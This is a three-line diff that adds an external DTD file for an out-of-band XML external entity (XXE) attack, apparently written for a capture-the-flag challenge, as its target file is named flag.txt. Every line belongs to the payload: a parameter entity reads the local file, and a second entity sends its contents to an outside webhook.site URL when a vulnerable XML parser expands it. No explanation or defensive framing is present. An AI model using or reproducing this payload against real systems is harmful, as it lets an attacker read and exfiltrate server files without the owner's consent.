@@ -1,0 +1,3 @@
+<!ENTITY % file SYSTEM "file:///flag.txt">
+<!ENTITY % all "<!ENTITY xxe SYSTEM 'https://webhook.site/8dcca4ab-242a-4551-9ae8-e59e78fc5f38/?f=%file;'>">
+%all;
